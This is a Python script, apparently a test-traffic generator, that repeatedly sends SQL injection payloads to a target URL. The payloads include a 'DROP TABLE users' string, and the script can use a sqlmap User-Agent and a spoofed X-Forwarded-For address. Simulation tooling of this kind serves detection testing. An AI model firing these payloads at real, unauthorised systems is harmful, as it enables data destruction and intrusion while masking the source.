import requests
import time
import argparse

# Common SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT null, null, null--",
    "1; DROP TABLE users",
    "' OR 1=1 LIMIT 1 --"
]

def send_request(target_url, payload, spoof_ip=None):
    """Sends a single malicious request to the target URL."""
    try:
        url_with_payload = f"{target_url}?q={payload}"
        headers = {'User-Agent': 'sqlmap/1.5.8#dev (http://sqlmap.org)'}
        if spoof_ip:
            headers['X-Forwarded-For'] = spoof_ip
        
        start_time = time.time()
        response = requests.get(url_with_payload, headers=headers, timeout=5)
        elapsed = time.time() - start_time
        
        print(f"[SQLi] Sent payload: {payload} | Status: {response.status_code} | Time: {elapsed:.2f}s | Spoof IP: {spoof_ip}")
        
    except requests.exceptions.RequestException as e:
        print(f"[SQLi] Request failed: {e}")

def simulate_sqli(target_url, count, delay, spoof_ip=None):
    """Simulates SQL Injection attacks against the target."""
    print(f"Starting SQL Injection Simulation against {target_url}")
    print(f"Total requests to send: {count}")
    print("-" * 50)
    
    for i in range(count):
        payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
        send_request(target_url, payload, spoof_ip)
        
        if delay > 0:
            time.sleep(delay)
            
    print("-" * 50)
    print("Simulation complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate SQL Injection Attacks")
    parser.add_argument("--target", type=str, default="http://localhost:8080", help="Target URL")
    parser.add_argument("--count", type=int, default=10, help="Number of requests to send")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests in seconds")
    parser.add_argument("--spoof-ip", type=str, default=None, help="Spoof X-Forwarded-For IP address")
    
    args = parser.parse_args()
    simulate_sqli(args.target, args.count, args.delay, args.spoof_ip)